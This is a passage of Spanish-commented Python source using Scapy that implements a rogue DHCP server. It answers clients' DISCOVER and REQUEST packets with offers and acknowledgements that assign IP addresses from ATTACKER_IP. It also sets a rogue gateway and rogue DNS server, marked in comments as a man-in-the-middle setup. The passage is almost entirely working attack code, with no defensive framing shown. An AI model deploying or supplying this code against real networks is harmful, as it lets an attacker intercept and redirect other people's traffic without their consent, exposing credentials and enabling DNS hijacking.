def get_next_ip(client_mac: str) -> str | None:
    """Devuelve la misma IP si el cliente ya tiene una, o asigna la siguiente del pool."""
    if client_mac in _leases:
        return _leases[client_mac]
    try:
        ip = next(_pool_iter)
        _leases[client_mac] = ip
        return ip
    except StopIteration:
        return None


# ══════════════════════════════════════════════════════════════════════════
#  CONSTRUCCIÓN DE PAQUETES DHCP
# ══════════════════════════════════════════════════════════════════════════
def build_dhcp_offer(discover_pkt) -> Ether | None:
    """Construye un DHCP OFFER en respuesta a un DISCOVER."""
    client_mac = discover_pkt[Ether].src
    xid        = discover_pkt[BOOTP].xid
    offered_ip = get_next_ip(client_mac)

    if not offered_ip:
        log.warning("Pool agotado – no se puede ofrecer IP a %s", client_mac)
        return None

    log.info("[DISCOVER → OFFER]  Cliente MAC=%s  Ofreciendo IP=%s", client_mac, offered_ip)

    offer = (
        Ether(dst=client_mac, src=get_if_hwaddr(IFACE)) /
        IP(src=ATTACKER_IP, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,           # BOOTREPLY
            yiaddr=offered_ip,
            siaddr=ATTACKER_IP,
            giaddr="0.0.0.0",
            chaddr=bytes.fromhex(client_mac.replace(":", "")),
            xid=xid,
            flags=0
        ) /
        DHCP(options=[
            ("message-type", "offer"),
            ("server_id",    ATTACKER_IP),
            ("lease_time",   LEASE_TIME),
            ("subnet_mask",  SUBNET_MASK),
            ("router",       GATEWAY_ROGUE),   # ← Gateway rogue (MitM)
            ("name_server",  DNS_ROGUE),        # ← DNS rogue
            "end"
        ])
    )
    return offer


def build_dhcp_ack(request_pkt) -> Ether | None:
    """Construye un DHCP ACK en respuesta a un REQUEST."""
    client_mac = request_pkt[Ether].src
    xid        = request_pkt[BOOTP].xid
    assigned_ip = _leases.get(client_mac)

    # Si el REQUEST es para otro servidor, ignorar
    for opt in request_pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "server_id":
            if opt[1] != ATTACKER_IP:
                return None

    if not assigned_ip:
        assigned_ip = get_next_ip(client_mac)
    if not assigned_ip:
        return None

    log.info("[REQUEST  → ACK  ]  Cliente MAC=%s  Confirmando IP=%s  GW=%s",
             client_mac, assigned_ip, GATEWAY_ROGUE)

    ack = (
        Ether(dst=client_mac, src=get_if_hwaddr(IFACE)) /
        IP(src=ATTACKER_IP, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,
            yiaddr=assigned_ip,
            siaddr=ATTACKER_IP,
            chaddr=bytes.fromhex(client_mac.replace(":", "")),
            xid=xid,
            flags=0
        ) /
        DHCP(options=[
            ("message-type", "ack"),
            ("server_id",    ATTACKER_IP),
            ("lease_time",   LEASE_TIME),
            ("subnet_mask",  SUBNET_MASK),
            ("router",       GATEWAY_ROGUE),   # ← Gateway rogue (MitM)
            ("name_server",  DNS_ROGUE),        # ← DNS rogue
            "end"
        ])
    )
    return ack


# ══════════════════════════════════════════════════════════════════════════
#  CALLBACK: manejo de cada paquete DHCP recibido
# ══════════════════════════════════════════════════════════════════════════
def handle_dhcp_packet(pkt):
    """Función llamada por sniff() para cada paquete capturado."""
    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return

    dhcp_type = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "message-type":
            dhcp_type = opt[1]
            break

    if dhcp_type == 1:       # DISCOVER
        offer = build_dhcp_offer(pkt)
        if offer:
            sendp(offer, iface=IFACE, verbose=False)

    elif dhcp_type == 3:     # REQUEST
        ack = build_dhcp_ack(pkt)
        if ack:
            sendp(ack, iface=IFACE, verbose=False)


